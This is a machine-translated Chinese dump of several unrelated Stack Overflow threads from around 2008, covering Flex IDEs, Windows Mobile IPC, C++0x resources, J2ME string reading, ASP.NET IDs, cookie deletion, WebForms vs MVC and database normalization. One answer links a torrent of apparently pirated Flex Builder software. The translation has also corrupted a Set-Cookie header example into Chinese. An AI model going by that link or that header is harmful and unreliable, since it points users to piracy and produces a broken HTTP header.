如果您使用[flex-mojos maven 插件](http://blog.flex-mojos.info/)创建设置，您可以非常轻松地设置构建环境，而无需拥有 flex builder 许可证。然后，您可以使用任何文本编辑器来编辑动作脚本并运行编译以及 FlexUnit 测试，只需调用`mvn package`.

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-14T11:21:25.580

试用官方的 Adob​​e Flex Builder Linux Alpha：

[http://labs.adobe.com/technologies/flex/flexbuilder_linux/](http://labs.adobe.com/technologies/flex/flexbuilder_linux/)

我还没有使用它，但我肯定打算这样做。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-14T15:59:23.427

我只是使用[jEdit](http://www.jedit.org/)和免费的[Flex SDK](http://www.adobe.com/products/flex/flexdownloads/#sdk)在 Mac OS X 上进行 Flex 开发，我和 Larry 一样开心（不管他有多开心）。

如果你想走这条路，我在下面添加了几个链接，指向为 AS3 开发配置 jEdit 的资源。AFAIK，与 Flex Builder 相比，此设置至少缺少代码完成、可视 MXML 编辑器和分析器功能。

*   [彩虹上的软件：jEdit 的 ActionScript 3 语法高亮显示](http://www.jesusgollonet.com/blog/2007/08/28/actionscript-3-edit-mode-jedit/)
*   [HiveMinds 杂志：将 jEdit 用于 Adob​​e Flex](http://www.hiveminds.co.uk/node/3791)
*   [Turdhead：jEdit 和 Actionscript：收集的文件](http://www.turdhead.com/jedit-and-actionscript-the-collected-files/)
*   [我博客中的“jEdit”类别](http://hasseg.org/blog/?cat=9)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-14T07:13:19.013

恐怕是这样。当然，您可以直接使用命令行工具，对于纯 AS 编码，这是可以的，因为 FB 在重构方面并不是那么好。但是对于 MXML，可视化编辑器是一个真正的优势。

您可以尝试[FlashDevelop](http://www.flashdevelop.org/)，但我个人在一年前发现它很糟糕。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-14T07:17:46.710

我在 Ubuntu 下尝试了 Flex Builder 的第一个 alpha 版本（当前是 3），它还可以，但不能用于生产（只是 alpha）
FlashDevelop 只能在 Windows 下工作，可能与 wine 一起工作......在我看来不是一个好的 IDE
[FDT](http://fdt.powerflasher.com/)与 Flex Builder 平视，但也不是免费的，我不知道它是否天生就可以在 Linux 上运行。

它是某种有线的，但我在 VirtualBox 中运行 Windows 安装，并在那里使用 FlexBuilder ......

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-11-28T06:35:36.227

我使用 Emacs 和自定义 hack 来支持 fcsh（Flex 编译器外壳）以加快重新编译时间。

fcsh-compile 可以[在此页面](http://anirudhs.chaosnet.org/code/ani-fcsh.el.html)上找到以及[博客条目](http://anirudhs.chaosnet.org/blog/2008.03.26.html)。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2010-09-24T09:12:29.753

您可以从这个 torrent 查看 fb4linux 解决方案：[http ://www.alivetorrents.com/torrent/8844946/flex-4-in-eclipse-3.6.0-for-linux](http://www.alivetorrents.com/torrent/8844946/flex-4-in-eclipse-3.6.0-for-linux)

包含带有 FB4Linux 的 Eclipse Helios。跑得真快。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2010-07-20T04:50:07.507

您可以使用 Eclipse 和 FDT 在 Linux 中获得一个（有点）功能性的 Flex 环境。[您可以在此处](http://www.brighthub.com/hubfolio/matthew-casperson/articles/73648.aspx)找到说明。

# windows-mobile - Windows Mobile 上的简易 IPC？

> ID：200225
> 
> 赞同：5
> 
> 时间：2008-10-14T07:10:39.907
> 
> 标签：windows-mobile, ipc

在 Windows Mobile 上的 C++ 项目（即没有 .NET）中，我正在寻找一种在两个独立运行的应用程序之间轻松通信的方法。应用程序 A 将运行一项服务，而应用程序 B 将为用户提供一些功能——为此 B 必须调用 A 的一些功能。我宁愿不在 COM 中实现任何东西。

事实上，我宁愿不做任何类型的序列化或类似的事情（即这将排除使用套接字/管道/文件），而是让 B 将所有参数和指针传递给 A，就像 A 是 B 的一部分一样。此外，应用程序 C、D 和 E 应该能够在仅运行一个 A 实例的情况下执行相同的操作。

我应该补充一点，B 有时应该向 A 返回一个数组（或 std::vector 或 std::map），其中大小以前不知道。

这在 Windows Mobile 和其他平台上是否可行？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-14T12:12:57.487

您不能只跨进程共享数据。我不推荐COM。Windows CE 中不存在管道。您最好的路线是[内存映射文件](http://msdn.microsoft.com/en-us/library/aa914748.aspx)（如桌面上）或[点对点消息队列](http://msdn.microsoft.com/en-us/library/ms885180.aspx)（与桌面上不同）。哪个更好取决于您的使用场景。

不要尝试按照建议*将*跨进程内存与 VirtualAlloc 一起使用，因为它是一种不安全的 hack 不安全并且在 CE 6.0 或更高版本上不受支持，因此您最终会在 WinMo 7 及更高版本下崩溃。

我不建议使用 Windows 消息和 WM_COPYDATA。它很慢，很笨拙，而且很容易出错。

各位，请不要在没有使用平台的时候回答问题，只是为了获得声誉积分。如果您不了解该平台，请让其他人帮助该人，而不是让他大吃一惊。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-11-10T06:34:19.660

既然您只需要应用程序 (B) 与服务 (A) 进行通信，为什么不直接使用`CreateFile`和`DeviceIoControl`定义一组 IOCTL？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-17T22:34:22.573

这是开始的好来源 - [http://msdn.microsoft.com/en-us/library/aa446520.aspx](http://msdn.microsoft.com/en-us/library/aa446520.aspx) 您决定哪个选项最适合您的需求。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-10-14T07:15:43.530

您已经涵盖了几乎所有可用的基础；COM、管道、套接字、内存映射文件。Windows 中的所有进程都有完全独立的内存空间，因此如果不使用其中一种 IPC 机制，您将无法共享任何内容。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2008-10-14T07:16:45.277

在 Windows Mobile 上，我似乎记得所有进程都映射到同一个地址空间。因此，在具有已知名称和/或类名称的两个进程中创建消息窗口，并在每个进程中使用 FindWindow 来查找另一个。

然后，SendMessage 带有一个 WM_APP 定义的消息 id 和一个指向要在 wParam 或 lParam 中传输的数据的指针。

如果我错了，Mobile 确实对进程内存进行了分区，那么只需使用 WM_COPYDATA - 在桌面上使用内存映射，因此速度非常快 - 在应用程序之间发送数据。

# java - Eclipse - 最终生成的方法参数

> ID：200229
> 
> 赞同：19
> 
> 时间：2008-10-14T07:13:24.190
> 
> 标签：java, eclipse, coding-style

Eclipse 能否将生成的方法（覆盖、实现接口等）的参数设置为最终参数，如果可以，如何设置？

如果我没记错的话，IntelliJ 有一个选项。我在 Eclipse 中找不到类似的东西。

我已经习惯于手动设置最终参数，但我希望有一个自动解决方案。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-14T07:39:43.280

AFAIK，这是不可能的。我没有在`Window > Preferences > Java > Editor > Templates or under Window > Preferences > Java > Code Style > Code Templates`.

无论如何，Eclipse 3.3+ 带有“保存操作”，这是一种替代机制。在`Preferencens > Java > Editors > Save`操作下可以配置“附加保存操作”。在代码样式选项卡上，有一个选项可以自动将 final 修饰符添加到私有字段、方法参数和局部变量。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-14T07:55:58.707

确实在“保存动作”中。查看此博客文章以获取屏幕截图：[Eclipse and the automagical final](http://enfranchisedmind.com/blog/2007/12/05/eclipse-and-the-automagical-final/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T07:33:11.063

'Project' -> 'Preferences' -> 'Java Code Style' -> 'Clean up' 下有清理选项，但是这些可以在生成代码后应用...

# c++ - 在哪里可以了解有关 C++0x 的更多信息？

> ID：200237
> 
> 赞同：70
> 
> 时间：2008-10-14T07:19:11.277
> 
> 标签：c++, c++11, reference-manual

我想了解更多关于 C++0x 的信息。有哪些好的参考资料和资源？有没有人写过一本关于这个主题的好书？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2008-10-14T07:28:29.310

*   [ISO C++ 委员会](http://www.open-std.org/jtc1/sc22/wg21/)
*   [Bjarne Stroustrup](http://www.research.att.com/~bs)
    *   尤其是他的[C++0x FAQ](http://www.research.att.com/~bs/C++0xFAQ.html)
    *   [](http://www.research.att.com/~bs/rules.pdf)*C/C++ 用户杂志[*的 C++0x 设计*](http://www.research.att.com/~bs/rules.pdf)[(pdf) ，2005 年 5 月](http://www.research.att.com/~bs/rules.pdf)*

**   维基百科的[C++0x 文章](http://en.wikipedia.org/wiki/C%2B%2B0x)*   G++使用 -std=c++0x 开关[对 C++0x 的实验性支持](http://gcc.gnu.org/projects/cxx0x.html)*   SO的[c++0x](/questions/tagged/c%2b%2b0x "显示标记为“c++0x”的问题")标签*

 ** * *

## 回答 #2

> 赞同：33
> 
> 时间：2008-10-14T08:49:33.467

## 关于文章

[Lambda 表达式](http://www.informit.com/guides/content.aspx?g=cplusplus&seqNum=254)，

[类型特征库](http://www.informit.com/guides/content.aspx?g=cplusplus&seqNum=276)，

[右值参考](http://www.informit.com/guides/content.aspx?g=cplusplus&seqNum=310)，

[概念](http://www.informit.com/guides/content.aspx?g=cplusplus&seqNum=313)，

[可变参数模板](http://www.informit.com/guides/content.aspx?g=cplusplus&seqNum=396)，

[shared_ptr](http://www.informit.com/guides/content.aspx?g=cplusplus&seqNum=239)

[常用表达](http://www.ddj.com/cpp/185300414)

[元组](http://www.ddj.com/cpp/184401974)

[多线程](http://www.informit.com/guides/printerfriendly.aspx?g=cplusplus&seqNum=414)

## 一般讨论;一般交流

[C/C++ 用户日志](http://www.petebecker.com/newlib1.html)，

[新的 C++](http://www.petebecker.com/newlib.html) ,

[文章](http://www.artima.com/cppsource/cpp0x.html)

## 视频

[谷歌技术讲座](http://video.google.com/videoplay?docid=2768126766555555011)

## 各种功能的概述

[维基百科的概述](http://en.wikipedia.org/wiki/C%2B%2B0x)

## 图书馆

[促进](http://www.boost.org/)

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2008-10-14T08:21:12.493

[Herb Sutter](http://herbsutter.wordpress.com)的博客，他发布了 C++0x 的新进展以及详细参考的链接

[Bjarne Stroustrup](http://www.research.att.com/~bs/)的网站

两人都是 ISO-C++ 标准委员会成员。Herb Sutter 将发布他参加的每次会议的最新信息。

[工作草案，编程语言 C++ 标准](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2008/n2798.pdf)

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-10-14T07:25:39.907

维基百科文章似乎是一个很好的起点：[C++0x](http://en.wikipedia.org/wiki/C%2B%2B0x)

它通过简短的示例提供了一个很好的摘要，并定期更新以匹配最新添加的内容。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-10-14T08:40:15.140

这里有两个关于这个主题的视频。它们有点旧，但仍然非常相关：下一个 C++ 标准中的新功能 ( [http://www.youtube.com/watch?v=ZAG5txfYnW4](http://www.youtube.com/watch?v=ZAG5txfYnW4) ) 和[编程语言系列中的高级主题：C++ 线程](http://video.google.com/videoplay?docid=3528799355371049884)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-09-21T14:40:47.577

这个网站上有很多东西——一些帖子包括非常丰富的讨论。我会把你指向谷歌，但在 imo 中搜索[C++0x 标记的帖子会更有效率。](https://stackoverflow.com/questions/tagged/c%2b%2b0x)

这是[一个很好](https://stackoverflow.com/questions/3645326/new-version-of-c)的开始，其中包括对[Stroustrup 自己的摘要的](http://www2.research.att.com/~bs/C++0xFAQ.html)间接引用。Scott Meyers 在[此处](http://www.artima.com/shop/overview_of_the_new_cpp)提供有关该主题的演示材料。

检查您最喜欢的编译器对新版本的支持。[此处](http://blogs.msdn.com/b/vcblog/archive/2010/04/06/c-0x-core-language-features-in-vc10-the-table.aspx)总结了 Microsoft VC10 支持。GCC 信息可以在[这里](http://gcc.gnu.org/projects/cxx0x.html)找到。

语言标准的官方状态可[在此处](http://www.open-std.org/jtc1/sc22/wg21/)获得。语言的演变在很多地方都与 Boost 中正在进行的工作有关。有关这方面的一些信息，请参见[此处](https://stackoverflow.com/questions/2193605/which-boost-libraries-are-heading-for-tr2)。

老实说，这些天我的偏好是在这里寻找 99% 的所需信息，而不是求助于一本书。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-06-01T13:18:54.000

您可以参考Scott Meyers[的 Presentation Materials：Overview of the New C++ (C++0x)](http://www.artima.com/shop/overview_of_the_new_cpp)。

# java - 如何在 J2ME 中读取字符串？

> ID：200239
> 
> 赞同：3
> 
> 时间：2008-10-14T07:20:51.383
> 
> 标签：java, java-me, network-programming, midp

我正在使用 MIDP 2.0 (JSR 118)，我只是注意到 J2ME 中没有字符串阅读器。

有谁知道您应该如何从独立于平台的方式（即在两个不同型号的启用 java 的手机之间）读取`InputStream`字符串`InputStreamReader`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-14T07:24:03.810

您使用的是哪个配置文件？JSR 118 中的 MID 配置文件指定了[InputStreamReader](http://java.sun.com/javame/reference/apis/jsr118/java/io/InputStreamReader.html)（不是 StringReader，但无论如何这无助于您从 InputStream 中读取数据）。

编辑：反映问题的变化:)

您使用 InputStreamReader.read(char[], int, int) ，当您阅读完所有内容后，从 char 数组创建一个新字符串。如果您想像从 BufferedReader 一样一次读取一行，则基本上需要自己实现 BufferedReader 的功能（保持“已读取但未消耗”字符的缓冲区）并继续读取直到遇到换行符。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T10:22:20.160

或者看看[`DataInputStream.readUTF()`](http://java.sun.com/javame/reference/apis/jsr118/java/io/DataInputStream.html#readUTF())。

它确实需要对从 InputStream 读取的字符串进行适当的编码（如通过相应的[`DataOutputStream.writeUTF(String)`](http://java.sun.com/javame/reference/apis/jsr118/java/io/DataOutputStream.html#writeUTF(java.lang.String))），因此它可能不是您要查找的内容 - 但它确实适用于不同的手机/型号等。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2011-10-19T13:38:04.860

嗯...我知道这是很久以前的事了。

你需要完全按照约翰所说的去做，而且非常简单。我第一次弄明白这个几乎花了我 5 个小时...

我仍然想知道为什么 j2ME 没有包含像`BufferedReader`套接字方法那样重要的东西，这不像是该死的手机会因此而崩溃......是的，如果我的应用程序运行速度比它慢 1 毫秒，我不会在乎应该。

（我只是把相关代码放上去，我假设你知道如何形成类和导入所需的库）

```
ServerSocketConnection listener
    = (ServerSocketConnection)Connector.open("socket://:1235");
System.out.println("Waiting for connection...");
StreamConnection server = listener.acceptAndOpen();
InputStream is = server.openInputStream();

//Now comes the fake BufferedReader equivalent part

int ch = 0;
StringBuffer sb = new StringBuffer();

while ((ch = is.read()) != -1){
    sb.append((char)ch);
    if(sb.charAt(sb.length()-1) == 13 ) {
       //Carriage return was received or ENTER was pressed
       break; //Exit loop and print input
    }
} 
```

如您所见，该`is.read()`方法将锁定线程，直到从用户一次一个字节接收到新输入。这意味着如果您使用 telnet 进行测试，则每次击键都会使循环迭代一次，因此，我们只需在 a 中将 char 逐个连接，`StringBuffer`直到收到 char 13。

```
System.out.println(sb.toString()); 
```

我希望这可以帮助人们尝试在 j2ME 上做一个套接字服务器。我已经为黑莓制作了一个功能齐全的多线程版本，以防万一有人需要它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-11-04T06:00:00.997

你能提供一个这样的例子吗？

您使用`InputStreamReader.read(char[], int, int)`并且当您阅读了所有您想要的内容后，从 char 数组创建一个新字符串。如果您想像 from 一样一次读取一行`BufferedReader`，则基本上需要自己实现 BufferedReader 的功能（保留“读取但未消耗”字符的缓冲区）并继续读取直到遇到换行符。

# asp.net - 为什么我的 ASP.NET 页面会在 html 元素 ID 中添加前缀“ctl00_ctl00”并破坏设计？

> ID：200247
> 
> 赞同：5
> 
> 时间：2008-10-14T07:26:00.033
> 
> 标签：asp.net, .net, css

我不明白。

母版页中 html 元素的 id 由相同的 id 更改，但带有前缀，这破坏了 css 设计。

在母版页中，我有：

```
<div id="container" runat="server">

    <asp:ContentPlaceHolder ...

... 
```

上面的代码被渲染

```
<div id="ctl00_ctloo_container">

     ... 
```

CSS 样式明显消失了。

我该如何阻止它？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T07:53:14.440

WebForms 应该只重写服务器控件的 ID（比如`<asp:ContentPlaceHolder />`，不是普通的 HTML 元素，比如`<div id="container">`没有`runat="server"`

您不能阻止框架重写服务器控件上的 ID。不过，您可以改用类名。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T07:33:47.550

AFAIK 你不能这样做。由于控制树，这是默认行为。

如果你想使用 CSS 直接设置 CSS 类，不要依赖 ID，比如

```
<asp:Whatever runat="server" id="whatever" CssClass="whateverClass"> 
```

**更新：** [这](https://stackoverflow.com/questions/38998/can-i-stop-net-eating-ids)是一个类似的线程，但它对您的 CSS 问题没有帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T08:09:21.350

你需要 runat="server" 标签吗？如果您没有对代码隐藏中的 div 元素执行任何操作，请将其删除。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-10-14T08:19:05.167

我不需要 runat="server" 标签并已将其删除。不知道它为什么在那里......现在ID没有改变。谢谢

# python - 如何删除我在某人的计算机上设置的 cookie？

> ID：200250
> 
> 赞同：5
> 
> 时间：2008-10-14T07:27:21.667
> 
> 标签：python, apache, http, cookies

我有一个用户登录的网络系统，它存储了他们会话的 cookie。当他们以其他人身份登录或注销时，我想删除我存储的原始 cookie。最好的方法是什么？我正在使用 Python 和 Apache，尽管我认为大多数语言的答案都是一样的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-14T07:35:43.303

再次设置 cookie，就像您第一次没有设置它一样，但指定一个过去的到期日期。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T07:28:51.553

我想最好的方法是将cookie的到期日期设置为过去的某个日期。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T07:38:45.840

返回标题

```
设置 Cookie：令牌=不透明；域=.your.domain; 到期时间=周四，1970 年 1 月 1 日 00:00:10 GMT；路径=/ 

```

域和路径必须与发出 cookie 的原始属性相匹配。

# asp.net-mvc - ASP.NET 网络表单是否被扫地出门为 mvc 腾出空间？

> ID：200256
> 
> 赞同：11
> 
> 时间：2008-10-14T07:29:07.170
> 
> 标签：asp.net-mvc, webforms

我已经阅读了所有关于 mvc 和 webforms 如何互补等的营销演讲......

然而，似乎所有的博客都在谈论 mvc，而唯一出来的新闻是关于 mvc。

Microsoft 是否会继续改进 webforms 作为一等公民，或者它只是一种受支持的技术，因为随着时间的推移，他们将所有真正的努力、开发人员和资源都转移到 mvc 上？

是否有任何真实证据表明在不久的将来 Web 表单会出现任何令人兴奋的新改进？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-05T17:03:54.800

你可以比看看 Phil Haak 11 月的帖子做得更糟：

> [WebForms 和 ASP.NET MVC 的未来](http://haacked.com/archive/2008/11/13/future-of-aspnet.aspx)

他指出了去年在 PDC 上在 ASP.NET 下宣布的 5 个关键事项：

1.  **核心基础架构**，包括规模和性能
2.  **Web 表单**，包括客户端 ID、ViewState、CSS 使用等问题
3.  **AJAX**
4.  **数据和动态数据**
5.  **MVC**

再加上，作为 ASP.NET MVC 的一部分构建的一些东西已经为 Web 表单发布，比如 Routing 模块，即使不使用 MVC，这对我的一些项目也会有很大帮助。

最重要的是，VS2010 中也有一些变化可以帮助 Web 开发人员使用 WebForms 或 MVC，这会很好。

博主们倾向于谈论什么是闪亮的和“新的”，事情就是这样发展的——你肯定会看到很多关于它的文字，尽管 MVC 几乎不是一种新的设计模式——它至少可以追溯到30年。

WPF/Silverlight 也是如此——它们是 WinForms/WebForms 杀手吗？不，它们是替代产品，与早期的做事方式相比有一些好处，但也有一些差异/缺点。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T12:49:12.593

我将在这里走出困境，不同意 MVC 是这里的“企业”框架或者在某种程度上是两者中更好的一般观点。

MVC 很棒！但是只看名字。它代表“模型、视图、控制器”……看到那里的“视图”了吗？

现在看看比赛，“Web Forms”……看到那个中的“forms”了吗？

MVC 在“视图”类型的情况下做得很好。对于发布内容（信息的“视图”）的站点，MVC 可能具有优势，特别是对于需要大量测试和非常正式的设计以支持智能视图切换的大型系统。

对于通过表单与用户进行大量交互的应用程序（数据收集和数据输入繁重的应用程序），Web 表单由于固有地使用表单帖子作为主要机制而具有优势。

虽然您可以使用 Web 表单制作视图，也可以使用 MVC 制作表单，但两者都有取舍。在当前的 MVC 状态下，我发现编写繁重的数据输入“视图”比使用 Web 表单要困难得多和痛苦……而且我的意思不是一点点。

在未来，我确实希望看到 MVC 在处理数据输入场景方面做得更好，但与使用 Web 表单的场景相比，这些场景可能会付出相当高的代价。

据我所知，两者都不比另一个更“企业”级别......我最感兴趣的是混合应用程序，它使用 MVC 进行业务的显示和发布端，而更自然地使用 Web 表单对于繁重的数据输入端......都在同一个网络项目中......我当然希望我们看到类似的东西。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-14T07:43:02.197

我参加了一次会议（Remix 08），Scott Gu 说他们肯定会继续支持这两种方法，并且 MVC 并不适合所有应用程序。Scott 表示，Web 表单模型即将进行一些改进（尽管没有说明它们是什么）。

Web 表单模型不会消失，因为：
Web 表单模型更适合某些类型的应用程序，例如小型应用程序，那些需要长时间进程以利用视图状态的
应用程序 许多应用程序正在使用它
许多为其开发的第三方组件
ASP.net实现还不成熟（虽然到目前为止看起来还不错）

微软可能会在几周后宣布 PDC 中的一些新功能。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-10-14T07:53:07.887

微软终于接受了一个基本的发展事实。你无法为任何问题提供终极解决方案。这就是开发 MVC 的原因，Scott Guthrie 明确指出 MVC 适用于更大、更多企业级的站点。Web 表单将继续存在并被开发为一种简单的、基于 RAD 的 Web 开发方法。

如果您退后一步并查看 Microsoft 堆栈的所有最新改进和添加，您可以很容易地将它们分类为这两个类。例如：

*   数据访问：LINQ-to-SQL 与 EntityFramework
*   远程处理：WCF 与 WebServices
*   LiveID：LiveID（Web）身份验证与 RPS 身份验证
*   ...

我只希望微软会随着时间的推移将这种区别变得更加清晰，因为开发人员似乎对于应该为哪个任务选择什么工具存在很多困惑。

总之，我认为微软将继续开发这两者，因为它们迎合了不同的开发人员配置文件。微软显然对尽可能地扩大其开发人员基础以及使 .NET 堆栈尽可能有用有很大的兴趣。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-04T15:06:04.133

在 MVC 框架的消息开始传播之前，我们花了很多时间在我的公司开发我们自己的 .NET MVC 框架。

这是因为我们不想被 WebForms 抽象的限制所束缚——我们想要避免 WebForms 似乎强加于大多数定制应用程序的“笨拙”感觉和用户界面妥协。此外，我们想要友好的 URI，并且我们想要比 WebForms 提供的更好的前端和后端开发分离（我们选择了 XML / XSLT 架构）。

在我看来，WebForms 实际上提供了一种更糟糕的与用户交互的方法，特别是由于使用 ViewState、PostBacks 等从开发人员那里抽象出 HTTP 的实际机制——这使得他们在允许用户方面的自由度更小与系统交互。经典的例子是，因为 WebForms 页面几乎总是 POST 的结果，如果用户尝试刷新页面，用户会从浏览器收到一个讨厌的警告消息。传统 Web 开发世界中处理这个问题的模式一直是在 HTTP 响应中包含一个 302 重定向指令，因此坚持原始的 HTTP 范式，GET 用于检索数据，POST 用于发送数据。其他，

也就是说，对于 RAD，WebForms 非常出色。我目前正在为我们使用自定义 MVC 框架开发的 web 应用程序开发管理应用程序，我正在飞速前进，因为我只需要显示大量数据库表的内容，并且在某些情况下允许用户以各种不同的方式编辑它们。

我认为，如果我们需要说服自己 MS 将继续支持 WebForms - 想想所有前 Windows 开发人员。这些是 WebForms 最初是为这些人开发的，而且他们不会消失。如果您是 WebForms 的粉丝，企业开发人员将是您的救星。

# php - 在创建高级 php 应用程序时，您如何知道如何设计 mysql 数据库？

> ID：200257
> 
> 赞同：6
> 
> 时间：2008-10-14T07:29:32.897
> 
> 标签：php, mysql, database, structure

我从来没有在 php 中创建过购物车或论坛。除了查看和分析其他人的项目或查看显示如何制作这样一个项目或如何成为这样一个项目的教程。一个人怎么会知道如何设计数据库结构来创建这样的东西？我猜测它可能是通过反复试验......

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-10-14T07:33:18.613

您应该阅读并理解[规范化](http://en.wikipedia.org/wiki/Database_normalization)的基础知识。对于大多数项目，规范化为第三范式就可以了。在某些情况下，您需要或多或少的规范化，但理解其背后的概念将使您能够思考您的数据库是如何以规范化格式构建的。

这是规范化表的一个非常基本的示例：

```
students
  student_id
  student_name
  student_class
  student_grade 
```

一个包含各种数据的非常标准的表格，但我们可以立即看到一些问题。我们可以看到一个学生的名字取决于他的ID，然而，一个学生可能参与多个班级，每个班级可能会有不同的年级。然后我们可以这样考虑表格：

```
students
  student_id
  student_name

class
  class_id
  class_name 
```

这还不错，现在我们可以看到我们有不同的学生，有不同的班级，但我们没有捕捉到学生的成绩。

```
grades
  student_id
  class_id
  grade 
```

现在我们有了第三张表，它可以让我们了解特定学生、特定班级以及与该班级相关的成绩之间的关系。从我们的第一个初始表开始，我们现在在规范化数据库中有 3 个表（假设我们不需要进一步规范化成绩，例如 :)）

我们可以从这个非常基本的例子中收集到一些东西：

*   我们的数据都与某种键相关联（student_id、class_id 和 student_id + class_id）。这些是每个表中的唯一标识符。
*   通过我们的键控关系，我们能够将信息相互关联（学生#4096 注册了多少个班级？）
*   我们可以看到我们的表现在不会包含重复的数据（想想我们的第一个表，其中 student_class 对于许多学生来说可能是相同的值。如果我们必须更改班级名称，我们就必须更新所有记录。在我们的标准化格式，我们可以只更新 class_id 的 class_name)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T07:39:04.717

您可以了解的有关数据库设计的主要技术称为[数据库规范化](http://en.wikipedia.org/wiki/Database_normalization)。

数据库规范化有其局限性，尤其是在您有很多事务的情况下。在某些时候，您可能会被迫去[规范化](http://en.wikipedia.org/wiki/Denormalization)。

但是恕我直言，从规范化的数据库设计开始总是更好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T21:11:33.093

我还建议使用可视化编辑器来创建数据库模式。我最近一直在使用：[http ://dev.mysql.com/workbench/](http://dev.mysql.com/workbench/)

创建数据库设计后，请有更多经验的人查看并给您反馈。但是要知道，尽可能多地花在设计上的时间，你最终将不得不进行实施，并且会发现你遗漏了一些东西，或者可以用另一种方式做得更好。

所以，设计，获得反馈，但不要害怕改变。

# javascript - ExtJS 的替代品是什么？

> ID：200284
> 
> 赞同：65
> 
> 时间：2008-10-14T07:43:49.170
> 
> 标签：javascript, extjs, frameworks

所以我正在寻找的是一个我可以使用的具有多个 UI 控件的 javascript 框架。我看过[jQuery](http://ui.jquery.com/home)，但与 ExtJS 相比，这些控件非常基本。还有其他有竞争力的选择吗？

> 这个问题的存在是因为它具有历史意义，但**它不被认为是本网站的一个很好的主题问题**，因此请不要将其用作您可以在这里提出类似问题的证据。更多信息：[帮助中心](https://stackoverflow.com/help)。

* * *

## 回答 #1

> 赞同：385
> 
> 时间：2010-01-27T06:03:46.520

就社区规模和在 StackOverflow 上的存在而言，没有什么能与[extjs相提并论。](/questions/tagged/extjs "显示标记为“extjs”的问题")尽管之前存在争议，Ext JS 现在拥有[GPLv3 开源许可证](http://www.sencha.com/legal/GPL/)。它的学习曲线很长，但是一旦学会了，它就会[很有收获](https://stackoverflow.com/a/8118471/1269037)。Ext JS[缺少 Material Design 主题](http://www.sencha.com/forum/showthread.php?295421-Google-Material-Design-theme)，团队一再[拒绝在 GitHub 上发布源代码](http://www.sencha.com/forum/showthread.php?274293-Kendo-UI-Vs-Sencha-js&p=1020935&viewfull=1#post1020935)。对于移动设备，必须使用单独的 Sencha Touch 库。

还要记住，

> 大型 JavaScript 库，例如 YUI，在社区中受到的关注较少。今天，许多开发人员将大型 JavaScript 库视为他们不想被锁定的围墙花园。

-- [YUI开发停止公告](http://yahooeng.tumblr.com/post/96098168666/important-announcement-regarding-yui)

也就是说，下面是一些当前可用的 Ext JS 替代品。

### 领先的客户端小部件库

1.  **Blueprint**是由大数据分析公司[Palantir](https://en.wikipedia.org/wiki/Palantir_Technologies)在 TypeScript 中开发的基于 React 的 UI 工具包，“针对为桌面应用程序构建复杂的数据密集型界面进行了优化”。截至 2019 年 5 月[在 GitHub 上积极开发，具有全面的文档。](https://github.com/palantir/blueprint/graphs/contributors)组件范围从简单（[芯片](https://blueprintjs.com/docs/#core/components/tag)、[吐司](https://blueprintjs.com/docs/#core/components/toast)、[图标](https://blueprintjs.com/docs/#icons)）到复杂（[树](https://blueprintjs.com/docs/#core/components/tree)、数据表、[带有自动完成功能的标签输入](https://blueprintjs.com/docs/#select/multi-select)、[日期范围选择器](https://blueprintjs.com/docs/#datetime/daterangepicker)。没有[手风琴](https://github.com/palantir/blueprint/issues/814)或[调整大小](https://github.com/palantir/blueprint/issues/3171)。

    Blueprint 面向现代浏览器（Chrome、Firefox、Safari、IE 11 和 Microsoft Edge），并根据[修改后的 Apache 许可证获得许可](https://github.com/palantir/blueprint/issues/2602#issuecomment-397602096)。

    [沙盒/演示](https://codesandbox.io/s/rypm429574)• [GitHub](https://github.com/palantir/blueprint/) • [Docs](https://blueprintjs.com/docs/)

